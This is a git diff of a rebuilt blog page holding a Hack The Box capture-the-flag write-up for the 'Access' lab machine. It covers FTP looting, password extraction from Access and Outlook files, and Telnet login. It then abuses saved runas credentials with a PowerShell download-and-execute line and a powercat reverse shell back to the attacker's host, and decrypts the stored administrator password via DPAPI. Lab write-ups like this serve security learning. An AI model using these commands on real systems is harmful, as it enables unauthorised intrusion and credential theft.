@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en-US">
   <head>
-    <meta name="generator" content="Hugo 0.56.3" />
+    <meta name="generator" content="Hugo 0.64.1" />
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hack The Box Write-up - Access | text/plain</title>
@@ -46,8 +46,7 @@ admin password using impacket.
 " />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://dominicbreuker.com/post/htb_access/" />
-
-<meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322" />
+<meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322"/>
 <meta property="article:published_time" content="2019-03-03T00:00:00+01:00" />
 <meta property="article:modified_time" content="2019-03-03T00:00:00+01:00" />
 
@@ -261,16 +260,14 @@ However, it is also easily discovered by enumeration. Although not necessary to
 get the flag, I demonstrate in the end of this post how to get the plaintext
 admin password using impacket.
 ">
-
-
 <meta itemprop="datePublished" content="2019-03-03T00:00:00&#43;01:00" />
 <meta itemprop="dateModified" content="2019-03-03T00:00:00&#43;01:00" />
 <meta itemprop="wordCount" content="2134">
+<meta itemprop="image" content="https://source.unsplash.com/category/technology/2000x1322"/>
 
 
 
 <meta itemprop="keywords" content="ctf,infosec,hackthebox,write-up," />
-
     <script async src="/js/baffle.js"></script>
     <header>
       <h1 class="baffle" itemprop="headline">Hack The Box Write-up - Access</h1>
@@ -309,30 +306,25 @@ admin password using impacket.
   <details>
     <summary>Table of Contents</summary>
     <nav id="TableOfContents">
-<ul>
-<li><a href="#port-scans">Port scans</a></li>
-<li><a href="#web-server">Web server</a></li>
-<li><a href="#ftp-login">FTP login</a>
-<ul>
-<li><a href="#microsoft-access-with-mdbtools">Microsoft Access with mdbtools</a></li>
-<li><a href="#microsoft-outlook-with-pst-utils">Microsoft Outlook with pst-utils</a></li>
-</ul></li>
-<li><a href="#telnet-login">Telnet login</a></li>
-<li><a href="#privesc-with-with-zkaccess3-5">PrivEsc with with ZKAccess3.5</a>
-<ul>
-<li><a href="#inspect-the-shortcut">Inspect the shortcut</a></li>
-<li><a href="#exploit-saved-credentials">Exploit saved credentials</a></li>
-<li><a href="#decrypt-administrator-password">Decrypt administrator password</a>
-<ul>
-<li><a href="#extract-credentials">Extract credentials</a></li>
-</ul></li>
-<li><a href="#extract-and-decrypt-master-key">Extract and decrypt master key</a>
-<ul>
-<li><a href="#decrypt-credentials">Decrypt credentials</a></li>
-</ul></li>
-</ul></li>
-<li><a href="#conclusion">Conclusion</a></li>
-</ul>
+  <ul>
+    <li><a href="#microsoft-access-with-mdbtools">Microsoft Access with mdbtools</a></li>
+    <li><a href="#microsoft-outlook-with-pst-utils">Microsoft Outlook with pst-utils</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#inspect-the-shortcut">Inspect the shortcut</a></li>
+    <li><a href="#exploit-saved-credentials">Exploit saved credentials</a></li>
+    <li><a href="#decrypt-administrator-password">Decrypt administrator password</a>
+      <ul>
+        <li><a href="#extract-credentials">Extract credentials</a></li>
+      </ul>
+    </li>
+    <li><a href="#extract-and-decrypt-master-key">Extract and decrypt master key</a>
+      <ul>
+        <li><a href="#decrypt-credentials">Decrypt credentials</a></li>
+      </ul>
+    </li>
+  </ul>
 </nav>
   </details>
   <script>
@@ -352,22 +344,16 @@ admin password using impacket.
 
 
     <div itemprop="articleBody">
-      
-
-<h1 id="port-scans">Port scans</h1>
-
+      <h1 id="port-scans">Port scans</h1>
 <p>A quick port scan with <a href="https://github.com/robertdavidgraham/masscan">masscan</a>
 reveals a bunch of open ports:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ masscan -e tun0 -p <span style="color: #ae81ff">1</span>-65535 --rate <span style="color: #ae81ff">2000</span> <span style="color: #ae81ff">10</span>.10.10.98
+<pre><code class="language-console" data-lang="console"> $ masscan -e tun0 -p 1-65535 --rate 2000 10.10.10.98
 ...
 Discovered open port 21/tcp on 10.10.10.98
 Discovered open port 80/tcp on 10.10.10.98
 Discovered open port 23/tcp on 10.10.10.98
-</code></pre></div>
-
-<p><a href="https://nmap.org/">nmap</a> provides more details on these ports. They run the
+</code></pre><p><a href="https://nmap.org/">nmap</a> provides more details on these ports. They run the
 expected services on a Windows box:</p>
-
 <pre><code> $ nmap -sV -sC -p 21,23,80 10.10.10.98
 ...
 PORT   STATE SERVICE VERSION
@@ -384,17 +370,12 @@ PORT   STATE SERVICE VERSION
 |_http-title: MegaCorp
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ...
-</code></pre>
-
-<p>nmap&rsquo;s default scripts discovered that anonymous FTP login is allowed, so we
+</code></pre><p>nmap&rsquo;s default scripts discovered that anonymous FTP login is allowed, so we
 should check that. Still, let&rsquo;s quickly check the web server first for
 completion.</p>
-
 <h1 id="web-server">Web server</h1>
-
 <p>The web server serves only a landing page with a picture of a few servers.
 There is nothing interesting about it. Fuzzing does not reveal anything either.</p>
-
 
 
 
@@ -431,12 +412,9 @@ There is nothing interesting about it. Fuzzing does not reveal anything either.<
   }
 </style>
 
-
 <h1 id="ftp-login">FTP login</h1>
-
 <p>Logging in to the FTP server is simple. We find two directories called Backups
 and Engineer:</p>
-
 <pre><code> $ ftp 10.10.10.98
 Connected to 10.10.10.98.
 220 Microsoft FTP Service
@@ -451,35 +429,26 @@ ftp&gt; dir
 08-23-18  09:16PM       &lt;DIR&gt;          Backups
 08-24-18  10:00PM       &lt;DIR&gt;          Engineer
 226 Transfer complete.
-</code></pre>
-
-<p>Rather than searching the contents remotely, it is easier to just download the
+</code></pre><p>Rather than searching the contents remotely, it is easier to just download the
 entire server contents to our local machine.
 <a href="https://www.gnu.org/software/wget/">wget</a> supports FTP downloads like so:</p>
-
 <pre><code> $ wget --recursive --ftp-user=anonymous --ftp-password=any --no-passive-ftp ftp://10.10.10.98
 ...
 2018-10-14 17:22:48 (368 KB/s) - ‘10.10.10.98/Backups/backup.mdb’ saved [5652480]
 ...
 2018-10-14 17:22:49 (86.9 KB/s) - ‘10.10.10.98/Engineer/Access Control.zip’ saved [10870]
 ...
-</code></pre>
-
-<p>Among the downloaded files, two stand out, as illustrated in the command line
+</code></pre><p>Among the downloaded files, two stand out, as illustrated in the command line
 output above. Attempting to decompress the ZIP file, you will find out it is
 password-protected. Thus it makes sense to start with &ldquo;backup.mdb&rdquo;.</p>
-
 <h2 id="microsoft-access-with-mdbtools">Microsoft Access with mdbtools</h2>
-
 <p>MDB files are Microsoft Access databases created by very old versions of MS
 Access (<a href="https://www.techopedia.com/definition/27395/mdb-file-format">2003 or
 below</a>). If you
 are on Linux or don&rsquo;t feel like buying a suitable MS Office, use
 <a href="https://github.com/brianb/mdbtools">mdbtools</a> to open them. It will allow you
 to print the database schema and run SQL queries on the tables.</p>
-
 <p>To print the schema, use <code>mdb-schema</code>:</p>
-
 <pre><code> $ mdb-schema ftp/10.10.10.98/Backups/backup.mdb
 ...
 CREATE TABLE [auth_user]
@@ -493,11 +462,8 @@ CREATE TABLE [auth_user]
         [Remark]                        Memo/Hyperlink (255)
 );
 ...
-</code></pre>
-
-<p>One table stands out as it contains username and password columns. To print the
+</code></pre><p>One table stands out as it contains username and password columns. To print the
 information, run a query with <code>mdb-sql</code>:</p>
-
 <pre><code> $ echo &quot;SELECT * FROM auth_user&quot; | mdb-sql -p ftp/10.10.10.98/Backups/backup.mdb
 
 id      username        password          Status  last_login          RoleID  Remark
@@ -505,11 +471,8 @@ id      username        password          Status  last_login          RoleID  Re
 27      engineer        access4u@security 1       08/23/18 21:13:36   26
 28      backup_admin    admin             1       08/23/18 21:14:02   26
 3 Rows retrieved
-</code></pre>
-
-<p>Passwords in plain text are always nice. We try them on the encrypted ZIP file
+</code></pre><p>Passwords in plain text are always nice. We try them on the encrypted ZIP file
 and et voilà, &ldquo;access4u@security&rdquo; works:</p>
-
 <pre><code> $ 7z x ftp/10.10.10.98/Engineer/Access\ Control.zip
 ...
 Enter password (will not be echoed):
@@ -520,20 +483,14 @@ p/10.10.10.98 (master) $ ll
 ...
 -rw-r--r-- 1 root 265K Aug 23 20:13 'Access Control.pst'
 ...
-</code></pre>
-
-<p>Out comes a PST file and nothing else.</p>
-
+</code></pre><p>Out comes a PST file and nothing else.</p>
 <h2 id="microsoft-outlook-with-pst-utils">Microsoft Outlook with pst-utils</h2>
-
 <p>PST files are the <a href="https://en.wikipedia.org/wiki/Personal_Storage_Table">Personal Storage
 Table</a> files used by
 Microsoft Outlook to store messages, calendar events and much more. On Linux,
 you can use <a href="https://packages.debian.org/jessie/utils/pst-utils">pst-utils</a> to
 search the contents of these files.</p>
-
 <p>Listing emails and converting them to text files is done like this:</p>
-
 <pre><code> $ lspst Access\ Control.pst
 Email   From: john@megacorp.com Subject: MegaCorp Access Control System &quot;security&quot; account
 
@@ -541,11 +498,8 @@ Email   From: john@megacorp.com Subject: MegaCorp Access Control System &quot;se
 Opening PST file and indexes...
 Processing Folder &quot;Deleted Items&quot;
         &quot;Access Control&quot; - 2 items done, 0 items skipped.
-</code></pre>
-
-<p>The commands above create a folder &ldquo;Access Control&rdquo; with the emails inside. We
+</code></pre><p>The commands above create a folder &ldquo;Access Control&rdquo; with the emails inside. We
 can print them out and discover another username and password:</p>
-
 <pre><code> $ cat Access\ Control/2
 ...
 From: john@megacorp.com &lt;john@megacorp.com&gt;
@@ -561,16 +515,11 @@ Regards,
 
 John
 ...
-</code></pre>
-
-<p>This is as far as you can get with FTP.</p>
-
+</code></pre><p>This is as far as you can get with FTP.</p>
 <h1 id="telnet-login">Telnet login</h1>
-
 <p>If you connect to port 23, you find that it is actually a Telnet server
 prompting you for a login. Thanks to the username and password we found in the
 email, we can get in and get a shell:</p>
-
 <pre><code>$ telnet 10.10.10.98 23
 Trying 10.10.10.98...
 Connected to 10.10.10.98.
@@ -585,19 +534,14 @@ Microsoft Telnet Server.
 *===============================================================
 C:\Users\security&gt;whoami
 access\security
-</code></pre>
-
-<p>With the shell, the user flag is only a few commands away.</p>
-
-<h1 id="privesc-with-with-zkaccess3-5">PrivEsc with with ZKAccess3.5</h1>
-
+</code></pre><p>With the shell, the user flag is only a few commands away.</p>
+<h1 id="privesc-with-with-zkaccess35">PrivEsc with with ZKAccess3.5</h1>
 <p>On the desktop of user &ldquo;Public&rdquo;, we find an LNK file, which is a Windows
 <a href="https://fileinfo.com/extension/lnk">shortcut</a>. It appears to link to an
 application called
 <a href="https://www.zkteco.com/en/product_detail/ZKAccess3.5.html">ZKAccess3.5</a>, which
 seems to be some sort of access control panel integrated with products from a
 company called <a href="https://www.zkteco.com/en/index.html">ZKTeco</a>.</p>
-
 <pre><code>C:\Users\Public\Desktop&gt;ir /a
 dir /a
  Volume in drive C has no label.
@@ -609,13 +553,9 @@ dir /a
 08/28/2018  07:51 AM    &lt;DIR&gt;          ..
 07/14/2009  05:57 AM               174 desktop.ini
 08/22/2018  10:18 PM             1,870 ZKAccess3.5 Security System.lnk
-</code></pre>
-
-<h2 id="inspect-the-shortcut">Inspect the shortcut</h2>
-
+</code></pre><h2 id="inspect-the-shortcut">Inspect the shortcut</h2>
 <p>On the Windows command line it is hard to read an LNK file. If you type it out
 it looks like this:</p>
-
 <pre><code>C:\Users\Public\Desktop&gt;type &quot;ZKAccess3.5 Security System.lnk&quot;
 LF@ 7#P/PO :+00/C:\R1M:Windows:M:*wWindowsV1MVSystem32:MV*System32X2P:
                                                                        runas.exe:1:1*Yrunas.exeL-KEC:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred &quot;C:\ZKTeco\ZKAccess3.5\Access.exe&quot;'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%
@@ -624,12 +564,9 @@ LF@ 7#P/PO :+00/C:\R1M:Windows:M:*wWindowsV1MVSystem32:MV*System32X2P:
                                                                                                           )ΰ[_8{E3
                                                                                                                   Oj)H
                                                                                                                       )ΰ[       1SPSXFL8C&amp;me*S-1-5-21-953262931-566350628-63446256-500
-</code></pre>
-
-<p>You can already see the &ldquo;runas&rdquo; command but it is somewhat hidden. For closer
+</code></pre><p>You can already see the &ldquo;runas&rdquo; command but it is somewhat hidden. For closer
 inspection, we could get it to our machine. Encode as base64 and copy
 over like so:</p>
-
 <pre><code>C:\Users\Public\Desktop&gt;certutil -encode &quot;ZKAccess3.5 Security System.lnk&quot; C:\Temp\encoded.txt
 certutil -encode &quot;ZKAccess3.5 Security System.lnk&quot; C:\Temp\encoded.txt
 Input Length = 1870
@@ -645,11 +582,8 @@ IwTKAQBQAAAAAAAAAQAAAAAAAAAAAAAAAAAAAC8BFAAfUOBP0CDqOmkQotgIACsw
 LQAxAC0ANQAtADIAMQAtADkANQAzADIANgAyADkAMwAxAC0ANQA2ADYAMwA1ADAA
 NgAyADgALQA2ADMANAA0ADYAMgA1ADYALQA1ADAAMAAAAAAAAAAAAAAAAAAAAA==
 -----END CERTIFICATE-----
-</code></pre>
-
-<p>Copy and paste the base64 above to a local file, then decode and inspect with
+</code></pre><p>Copy and paste the base64 above to a local file, then decode and inspect with
 <a href="https://www.forensicswiki.org/wiki/Liblnk">Liblnk</a>:</p>
-
 <pre><code> $ cat lnk | base64 -d &gt; ZKAccess3.5_Security_System.lnk
  $ lnkinfo ZKAccess3.5_Security_System.lnk
 Link information:
@@ -659,18 +593,13 @@ Link information:
 ...
         Command line arguments          : /user:ACCESS\Administrator /savecred &quot;C:\ZKTeco\ZKAccess3.5\Access.exe&quot;
 ...
-</code></pre>
-
-<p>Much more readable. The file actually links to &ldquo;runas.exe&rdquo; and passes the flag &ldquo;/savecred&rdquo; to it.
+</code></pre><p>Much more readable. The file actually links to &ldquo;runas.exe&rdquo; and passes the flag &ldquo;/savecred&rdquo; to it.
 This suggests somebody set up this link to conveniently run the tool as
 Administrator without being prompted by Windows all the time (compare this
 <a href="https://www.howtogeek.com/124087/how-to-create-a-shortcut-that-lets-a-standard-user-run-an-application-as-administrator/">guide</a>).</p>
-
 <h2 id="exploit-saved-credentials">Exploit saved credentials</h2>
-
 <p>Conveniently we can now run everything else as Administrator too. Another way
 to discover would have been to just list the stored credentials:</p>
-
 <pre><code>C:\Users\Public\Desktop&gt;cmdkey /list
 
 Currently stored credentials:
@@ -678,32 +607,19 @@ Currently stored credentials:
     Target: Domain:interactive=ACCESS\Administrator
                                                        Type: Domain Password
     User: ACCESS\Administrator
-</code></pre>
-
-<p>To check if we can really use &ldquo;runas&rdquo;, we could just ping ourselves:</p>
-
+</code></pre><p>To check if we can really use &ldquo;runas&rdquo;, we could just ping ourselves:</p>
 <pre><code>C:\Users\security&gt;runas /savecred /user:ACCESS\Administrator &quot;ping -n 1 10.10.14.122&quot;
-</code></pre>
-
-<p>Locally, listen for the ICMP packets. If you see them incoming, the ping command
+</code></pre><p>Locally, listen for the ICMP packets. If you see them incoming, the ping command
 actually ran:</p>
-
 <pre><code> $ tcpdump -i tun0 icmp
 17:16:32.326338 IP 10.10.10.98 &gt; 10.10.14.122: ICMP echo request, id 1, seq 3, length 40
 17:16:32.326367 IP 10.10.14.122 &gt; 10.10.10.98: ICMP echo reply, id 1, seq 3, length 40
-</code></pre>
-
-<p>With <a href="https://github.com/besimorhino/powercat">powercat</a> we can now get a
-shell as administrator easily. Host powercat.ps1 locally, e.g., with <code>python -m
-SimpleHTTPServer 80</code>, append a line to the end of the file to send a shell
+</code></pre><p>With <a href="https://github.com/besimorhino/powercat">powercat</a> we can now get a
+shell as administrator easily. Host powercat.ps1 locally, e.g., with <code>python -m SimpleHTTPServer 80</code>, append a line to the end of the file to send a shell
 (<code>powercat -c 10.10.14.122 -p 9006 -e cmd</code>), and execute on the remote machine
 with <code>runas</code>:</p>
-
 <pre><code>C:\Users\security&gt;runas /savecred /user:ACCESS\Administrator &quot;powershell -c \&quot;IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.122/powercat.ps1')\&quot;&quot;
-</code></pre>
-
-<p>Don&rsquo;t forget a local listener to catch the shell:</p>
-
+</code></pre><p>Don&rsquo;t forget a local listener to catch the shell:</p>
 <pre><code> $ nc -lnvp 9006
 listening on [any] 9006 ...
 connect to [10.10.14.122] from (UNKNOWN) [10.10.10.98] 49173
@@ -713,30 +629,22 @@ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 C:\Windows\system32&gt;whoami
 whoami
 access\administrator
-</code></pre>
-
-<p>The root flag is now easily accessible.</p>
-
+</code></pre><p>The root flag is now easily accessible.</p>
 <h2 id="decrypt-administrator-password">Decrypt administrator password</h2>
-
 <p>Since the credentials for the administrator are stored on the box we can also
 get them. Windows uses the <a href="https://en.wikipedia.org/wiki/Data_Protection_API">DPAPI</a>
 to store credentials encrypted. Their encryption is based on one or more master
 keys which are themselves encrypted with the user password. Thus, given
 the user password, you can get stored credentials in plaintext. More details
 can be found in this <a href="https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/">blog post</a>.</p>
-
 <p>Usually <a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a> is used for this
 extraction but <a href="https://github.com/SecureAuthCorp/impacket">impacket</a> now also
 has support for it. I&rsquo;m using the latter here.</p>
-
 <h3 id="extract-credentials">Extract credentials</h3>
-
 <p>Credentials are stored in &ldquo;C:\Users\security\AppData\Roaming\Microsoft\Credentials&rdquo;.
 The first step is to download the only stored credential for user &ldquo;security&rdquo;,
 which must be the one for the administrator account. A short binary file is
 best extracted by encoding as base64:</p>
-
 <pre><code>C:\Users\security\AppData\Roaming\Microsoft\Credentials&gt;dir /a
  Volume in drive C has no label.
  Volume Serial Number is 9C45-DBF0
@@ -769,13 +677,10 @@ ZezIrM1LWzwMLM/K5rCnY4Sg4nxO23oOzs4q/ZiJJSME21dnu8NAAAAAY/zBU7zW
 C+/QdKUJjqDlUviAlWLFU5hbqocgqCjmHgW9XRy4IAcRVRoQDtO4U1mLOHW6kLaJ
 vEgzQvv2cbicmQ==
 -----END CERTIFICATE-----
-</code></pre>
-
-<p>Locally, we decode the base64 (which was put into &ldquo;credentials.b64&rdquo;) and use
+</code></pre><p>Locally, we decode the base64 (which was put into &ldquo;credentials.b64&rdquo;) and use
 <a href="https://github.com/SecureAuthCorp/impacket">impacket</a> to print some details
 about the file. Most importantly, the Guid of the master key is
 &ldquo;0792C32E-48A5-4FE3-8B43-D93D64590580&rdquo;:</p>
-
 <pre><code> $ cat credentials.b64 | base64 -d &gt; credentials
  $ python /opt/impacket/examples/dpapi.py credential -file credentials
 Impacket v0.9.19-dev - Copyright 2019 SecureAuth Corporation
@@ -797,19 +702,14 @@ Data             : e73542ff71d08529f9da5ff88edcd5be44d11c9c02c45fdfd9ee5a531628c
 Sign             : 63fcc153bcd60befd074a5098ea0e552f8809562c553985baa8720a828e61e05bd5d1cb8200711551a100ed3b853598b3875ba90b689bc483342fbf671b89c99
 
 Cannot decrypt (specify -key or -sid whenever applicable)
-</code></pre>
-
-<p>The data of this credential is encrypted with this master key. Thus, we have to
+</code></pre><p>The data of this credential is encrypted with this master key. Thus, we have to
 get this master key now.</p>
-
 <h2 id="extract-and-decrypt-master-key">Extract and decrypt master key</h2>
-
 <p>The master key lives in a file
-&ldquo;C:\Users\security\AppData\Roaming\Microsoft\Protect&lt;SID&gt;&lt;Guid&gt;&ldquo;,
+&ldquo;C:\Users\security\AppData\Roaming\Microsoft\Protect&lt;SID&gt;&lt;Guid&gt;&rdquo;,
 where SID is the SID of the current user, i.e., &ldquo;security&rdquo;, and Guid is the
 Guid of the key, i.e., &ldquo;0792c32e-48a5-4fe3-8b43-d93d64590580&rdquo;. Move to this
 folder and extract the master key file in the same way as the credentials:</p>
-
 <pre><code>C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001&gt;certutil -encode 0792c32e-48a5-4fe3-8b43-d93d64590580 C:\Temp\encoded.txt
 Input Length = 468
 Output Length = 700
@@ -828,12 +728,9 @@ D+azql3Tr0a9eofLwBYfxBrhP4cUoivLW9qG8k2VrQM2mlM1FZGF0CdnQ9DBEys1
 /a/60kfTxPX0MmBBPCi0Ae1w5C4BhPnoxGaKvDbrcye9LHN0ojgbTN1Op8Rl3qp1
 Xg9TZyRzkA24hotCgyftqgMAAADlaJYABZMbQLoN36DhGzTQ
 -----END CERTIFICATE-----
-</code></pre>
-
-<p>Now use impacket again to decrypt. The master key is encrypted with the user&rsquo;s
+</code></pre><p>Now use impacket again to decrypt. The master key is encrypted with the user&rsquo;s
 password, which is &ldquo;4Cc3ssC0ntr0ller&rdquo; for user &ldquo;security&rdquo;. You also need the
 SID, which we know from the path above (or could easily get with <code>whoami /all</code>):</p>
-
 <pre><code> $ python /opt/impacket/examples/dpapi.py masterkey -file masterkey -sid 'S-1-5-21-953262931-566350628-63446256-1001'
 Impacket v0.9.19-dev - Copyright 2019 SecureAuth Corporation
 
@@ -850,14 +747,10 @@ DomainKeyLen: 00000000 (0)
 Password:
 Decrypted key with User Key (SHA1)
 Decrypted key: 0xb360fa5dfea278892070f4d086d47ccf5ae30f7206af0927c33b13957d44f0149a128391c4344a9b7b9c9e2e5351bfaf94a1a715627f27ec9fafb17f9b4af7d2
-</code></pre>
-
-<h3 id="decrypt-credentials">Decrypt credentials</h3>
-
+</code></pre><h3 id="decrypt-credentials">Decrypt credentials</h3>
 <p>With the master key
 &ldquo;0xb360fa5dfea278892070f4d086d47ccf5ae30f7206af0927c33b13957d44f0149a128391c4344a9b7b9c9e2e5351bfaf94a1a715627f27ec9fafb17f9b4af7d2&rdquo;
 we can decrypt the credentials:</p>
-
 <pre><code> $ python /opt/impacket/examples/dpapi.py credential -file credentials -key 0xb360fa5dfea278892070f4d086d47ccf5ae30f7206af0927c33b13957d44f0149a128391c4344a9b7b9c9e2e5351bfaf94a1a715627f27ec9fafb17f9b4af7d2
 Impacket v0.9.19-dev - Copyright 2019 SecureAuth Corporation
 
@@ -871,11 +764,8 @@ Description :
 Unknown     :
 Username    : ACCESS\Administrator
 Unknown     : 55Acc3ssS3cur1ty@megacorp
-</code></pre>
-
-<p>Now log in via telnet with credentials &ldquo;administrator&rdquo; and
+</code></pre><p>Now log in via telnet with credentials &ldquo;administrator&rdquo; and
 &ldquo;55Acc3ssS3cur1ty@megacorp&rdquo;:</p>
-
 <pre><code> $ telnet 10.10.10.98
 Trying 10.10.10.98...
 Connected to 10.10.10.98.
@@ -898,21 +788,15 @@ User Name            SID
 ==================== =========================================
 access\administrator S-1-5-21-953262931-566350628-63446256-500
 ...
-</code></pre>
-
-<p>Like above, we have a shell as administrator :)</p>
-
+</code></pre><p>Like above, we have a shell as administrator :)</p>
 <h1 id="conclusion">Conclusion</h1>
-
 <p>Quite an easy job to get the flags. The box is interesting for 2 reasons. One
 is that you can try a lot of Linux tools to extract data out of various
 proprietary Microsoft files. It is always nice to be able to do that quickly
 without having to spin up a Windows VM. The other is reason is that it allows
 to play with stored credentials on Windows. Extracting the admin password
 manually is a nice way to understand how credentials are handled.</p>
-
 <p>Other write-ups for Access include:</p>
-
 <ul>
 <li>ippsec video on <a href="https://www.youtube.com/watch?v=Rr6Oxrj2IjU">YouTube</a>.</li>
 <li>Detailed <a href="https://0xdf.gitlab.io/2019/03/02/htb-access.html">write-up</a>
